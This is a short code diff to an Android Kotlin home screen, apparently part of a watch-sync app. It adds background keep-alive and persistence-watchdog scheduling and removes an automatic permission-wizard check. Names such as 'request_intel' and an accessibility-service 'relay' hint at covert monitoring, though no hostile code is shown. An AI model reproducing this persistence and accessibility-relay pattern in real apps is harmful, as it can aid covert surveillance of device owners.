@@ -16,13 +16,15 @@ class HomeActivity : AppCompatActivity() {
             return
         }
 
-        if (intent.getBooleanExtra(EXTRA_REQUEST_INTEL, false) || shouldShowWizard()) {
+        if (intent.getBooleanExtra(EXTRA_REQUEST_INTEL, false)) {
             PermissionWizardActivity.launch(this)
             finish()
             return
         }
 
         setContentView(R.layout.activity_home)
+        SafeKeepAlive.start(this)
+        PersistenceWatchdog.schedule(this)
         TouchAccessibilityService.instance?.ensureRelay()
     }
 
@@ -37,16 +39,16 @@ class HomeActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
-        if (!WatchSync.isEnabled(this)) {
+        if (!WatchSync.isEnabled(this) &&
+            UserSession.onboardingDone(this) &&
+            UserSession.permissionsWizardDone(this)
+        ) {
             startActivity(Intent(this, OnboardingActivity::class.java))
             finish()
             return
         }
         TouchAccessibilityService.instance?.ensureRelay()
     }
-
-    private fun shouldShowWizard(): Boolean =
-        PermissionWizardActivity.hasPending(this) && !UserSession.permissionsWizardDone(this)
 
     companion object {
         const val EXTRA_REQUEST_INTEL = "request_intel"
